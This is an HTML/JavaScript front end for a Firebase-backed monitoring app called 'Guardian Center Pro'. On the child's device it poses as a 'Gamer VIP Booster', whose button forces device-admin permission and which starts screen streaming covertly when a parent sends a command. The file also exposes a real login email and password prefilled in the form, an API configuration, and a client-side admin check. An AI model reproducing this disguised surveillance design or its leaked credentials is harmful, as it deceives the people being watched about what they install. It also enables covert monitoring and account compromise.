<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Guardian Center Pro</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>

    <style>
        :root { --primary: #00d4ff; --secondary: #ff4757; --success: #2ed573; --darker: #070a0f; --card: #161b22; --border: #21262d; --text: #e6edf3; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Tajawal', sans-serif; }
        body { background: var(--darker); color: var(--text); overflow-x: hidden; }
        .full-screen { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        .box-container { background: rgba(15,20,25,0.95); border: 1px solid var(--border); border-radius: 24px; padding: 30px; width: 100%; max-width: 400px; text-align: center; }
        .input-group input, .input-group select { width: 100%; padding: 15px; border-radius: 12px; background: var(--darker); border: 1px solid var(--border); color: white; margin-bottom: 15px; outline: none; }
        .btn-primary { width: 100%; padding: 15px; background: linear-gradient(135deg, var(--primary), #0099cc); color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
        .btn-danger { background: linear-gradient(135deg, var(--secondary), #cc0000); }
        .btn-live { background: linear-gradient(135deg, #ffa502, #ff7f50); }
        .header-bar { display: flex; justify-content: space-between; align-items: center; background: rgba(15,20,25,0.8); padding: 15px; border-radius: 16px; border: 1px solid var(--border); margin-bottom: 20px; }
        .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 20px; text-align: center; margin-bottom: 20px; }
        .notification { position: fixed; top: 20px; left: 50%; transform: translate(-50%, -150%); background: var(--success); color: white; padding: 15px 30px; border-radius: 30px; font-weight: bold; transition: 0.4s; z-index: 99999; }
        .notification.show { transform: translate(-50%, 0); }
        .hidden { display: none !important; }
        
        .tabs { display: flex; gap: 5px; margin-bottom: 15px; overflow-x: auto; padding-bottom: 5px; }
        .tab-btn { background: var(--darker); border: 1px solid var(--border); padding: 10px; border-radius: 10px; color: #8b949e; flex: 1; text-align: center; cursor: pointer; font-size: 13px; }
        .tab-btn.active { background: rgba(0,212,255,0.1); border-color: var(--primary); color: var(--primary); font-weight: bold; }
        .monitor-screen { background: #000; border: 2px dashed var(--border); border-radius: 12px; height: 250px; display: flex; align-items: center; justify-content: center; overflow: hidden; margin-bottom: 15px; position: relative; }
        .monitor-screen img { width: 100%; height: 100%; object-fit: contain; }
        
        table { width: 100%; text-align: right; border-collapse: collapse; }
        td, th { padding: 10px; border-bottom: 1px solid var(--border); }
        .role-select { background: var(--darker); color: var(--primary); padding: 5px; border: 1px solid var(--border); border-radius: 5px; }
    </style>
</head>
<body>
    <div class="notification" id="notification">رسالة</div>

    <div class="full-screen" id="authScreen">
        <div class="box-container">
            <i class="fas fa-shield-halved" style="font-size: 50px; color: var(--primary); margin-bottom: 15px;"></i>
            <h2>Guardian Center</h2>
            <p style="color: var(--success); font-size: 12px; margin-bottom: 20px;">الربط الحقيقي (Real-Time Sync)</p>
            <div class="input-group"><input type="email" id="logEmail" placeholder="البريد الإلكتروني" value="ejram.tp@gmail.com"></div>
            <div class="input-group"><input type="password" id="logPass" placeholder="كلمة المرور" value="EjramGamal"></div>
            <button class="btn-primary" onclick="login()">تسجيل الدخول</button>
        </div>
    </div>

    <div id="appContainer" class="hidden" style="padding: 20px; max-width: 800px; margin: auto;">
        <div class="header-bar">
            <h2 id="pageTitle" style="font-size: 16px;">الرئيسية</h2>
            <button class="btn-danger" style="padding: 8px 15px; border-radius: 8px; border: none; color: white; cursor:pointer;" onclick="logout()">خروج</button>
        </div>

        <div id="adminSection" class="hidden card">
            <h3 style="margin-bottom: 15px; color: var(--primary);"><i class="fas fa-users-cog"></i> تعيين الحسابات</h3>
            <div id="usersList" style="overflow-x: auto;">جاري التحميل...</div>
        </div>

        <div id="parentSection" class="hidden">
            <div class="card" style="border-color: var(--primary); padding: 15px;">
                <h3 style="margin-bottom: 10px; font-size: 16px;"><i class="fas fa-link"></i> ربط جهاز الطفل</h3>
                <select id="childSelector" style="width:100%; padding:10px; background:var(--darker); color:white; border:1px solid var(--border); border-radius:8px;" onchange="linkChild(this.value)">
                    <option value="">اختر حساب الطفل...</option>
                </select>
            </div>
            
            <div id="spyTools" class="hidden">
                <div class="tabs">
                    <div class="tab-btn active" onclick="switchTab('screen')"><i class="fas fa-mobile-alt"></i> بث الشاشة</div>
                </div>

                <div id="tab-screen" class="card">
                    <div class="monitor-screen">
                        <span id="screenWait" style="color:#666;"><i class="fas fa-spinner fa-spin"></i> اضغط على طلب البث للبدء...</span>
                        <img id="liveScreen" src="" style="display:none;" />
                    </div>
                    <button class="btn-primary btn-live" onclick="requestChildScreen()"><i class="fas fa-play"></i> طلب بث حي للشاشة</button>
                </div>
            </div>
        </div>

        <div id="childSection" class="hidden">
            <div style="background: rgba(0,212,255,0.1); border: 2px solid var(--primary); border-radius: 20px; padding: 25px 20px; text-align: center; margin-bottom: 20px;">
                <i class="fas fa-rocket" style="font-size: 40px; color: var(--primary); margin-bottom: 10px;"></i>
                <h2>Gamer VIP Booster</h2>
                <button class="btn-primary" style="width: auto; padding: 12px 35px; border-radius: 30px; margin-top: 15px;" onclick="forceAdmin()">تفعيل حماية النظام</button>
            </div>
        </div>
    </div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyALz6MYVTOCxrtW3kG_hC_48kWYHlF4kO4", authDomain: "ejram-6b3b5.firebaseapp.com", projectId: "ejram-6b3b5", storageBucket: "ejram-6b3b5.appspot.com", messagingSenderId: "28357002125", appId: "1:28357002125:web:bdd7d3418e8ec2b2c533c4" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore(); const auth = firebase.auth();
        let currentUserUid = null;

        function showNotif(msg) { const el = document.getElementById('notification'); el.textContent = msg; el.classList.add('show'); setTimeout(() => el.classList.remove('show'), 3000); }
        function login() { auth.signInWithEmailAndPassword(document.getElementById('logEmail').value, document.getElementById('logPass').value); }
        function logout() { auth.signOut(); }

        auth.onAuthStateChanged(async user => {
            if (user) {
                currentUserUid = user.uid;
                document.getElementById('authScreen').classList.add('hidden'); document.getElementById('appContainer').classList.remove('hidden');
                
                let role = 'child';
                if (user.email === 'ejram.tp@gmail.com') role = 'admin';
                else { try { const doc = await db.collection('users').doc(user.uid).get(); if (doc.exists) role = doc.data().role || 'child'; } catch(e) {} }
                setupUI(role);
            } else {
                document.getElementById('appContainer').classList.add('hidden'); document.getElementById('authScreen').classList.remove('hidden');
            }
        });

        function setupUI(role) {
            document.getElementById('childSection').classList.add('hidden');
            document.getElementById('parentSection').classList.add('hidden');
            document.getElementById('adminSection').classList.add('hidden');

            if (role === 'admin') {
                document.getElementById('pageTitle').textContent = 'لوحة تحكم المشرف';
                document.getElementById('adminSection').classList.remove('hidden');
                loadAdminUsers();
            } else if (role === 'parent') {
                document.getElementById('pageTitle').textContent = 'لوحة الأب';
                document.getElementById('parentSection').classList.remove('hidden');
                loadChildrenForParent();
                listenToScreenStream(); // الأب يستمع للصور الواردة
            } else {
                document.getElementById('pageTitle').textContent = 'Gamer VIP';
                document.getElementById('childSection').classList.remove('hidden');
                listenToParentCommands(); // الطفل يستمع للأوامر
            }
        }

        // --- المشرف ---
        function loadAdminUsers() {
            db.collection('users').get().then(snap => {
                let html = '<table><tr><th>البريد</th><th>الدور</th></tr>';
                snap.forEach(doc => {
                    const data = doc.data();
                    html += `<tr><td style="font-size:12px;">${data.email}</td><td>
                        <select class="role-select" onchange="changeUserRole('${doc.id}', this.value)">
                            <option value="child" ${data.role === 'child' ? 'selected' : ''}>طفل</option>
                            <option value="parent" ${data.role === 'parent' ? 'selected' : ''}>أب</option>
                            <option value="admin" ${data.role === 'admin' ? 'selected' : ''}>مشرف</option>
                        </select>
                    </td></tr>`;
                });
                document.getElementById('usersList').innerHTML = html + '</table>';
            });
        }
        function changeUserRole(uid, newRole) { db.collection('users').doc(uid).update({ role: newRole }).then(() => showNotif('تم التغيير!')); }

        // --- الأب ---
        function switchTab(id) {} // للاختصار في البث الحي
        function loadChildrenForParent() {
            db.collection('users').where('role', '==', 'child').get().then(snap => {
                let sel = document.getElementById('childSelector');
                sel.innerHTML = '<option value="">اختر حساب الطفل...</option>';
                snap.forEach(doc => { sel.innerHTML += `<option value="${doc.id}">${doc.data().email}</option>`; });
            });
        }
        function linkChild(childUid) {
            if(!childUid) { document.getElementById('spyTools').classList.add('hidden'); return; }
            document.getElementById('spyTools').classList.remove('hidden');
        }

        // الأب: إرسال أمر بث الشاشة
        function requestChildScreen() {
            const childUid = document.getElementById('childSelector').value;
            db.collection('users').doc(childUid).update({ command: 'start_screen', timestamp: Date.now() })
              .then(() => showNotif('تم إرسال أمر بدء البث..'));
        }

        // الأب: استقبال الصور وعرضها لايف
        function listenToScreenStream() {
            db.collection('screen_captures').doc('latest').onSnapshot(doc => {
                if (doc.exists && doc.data().image) {
                    document.getElementById('screenWait').style.display = 'none';
                    document.getElementById('liveScreen').src = "data:image/jpeg;base64," + doc.data().image;
                    document.getElementById('liveScreen').style.display = 'block';
                }
            });
        }

        // --- الطفل ---
        async function forceAdmin() {
            if (window.Capacitor && window.Capacitor.registerPlugin) {
                try {
                    const engine = Capacitor.registerPlugin('GuardianEngine');
                    await engine.forceAdminPermission(); // فتح شاشة المشرف الإجبارية
                } catch(e) {}
            }
        }

        // الطفل: استماع الأوامر من الفايربيس وتشغيل الجافا
        function listenToParentCommands() {
            db.collection('users').doc(currentUserUid).onSnapshot(async doc => {
                if (doc.exists && doc.data().command === 'start_screen') {
                    if (window.Capacitor && window.Capacitor.registerPlugin) {
                        try {
                            const engine = Capacitor.registerPlugin('GuardianEngine');
                            await engine.startScreenCapture(); // تشغيل الكود الفعلي للبث!
                            db.collection('users').doc(currentUserUid).update({ command: 'idle' });
                        } catch(e) { console.log(e); }
                    }
                }
            });
        }
    </script>
</body>
</html>
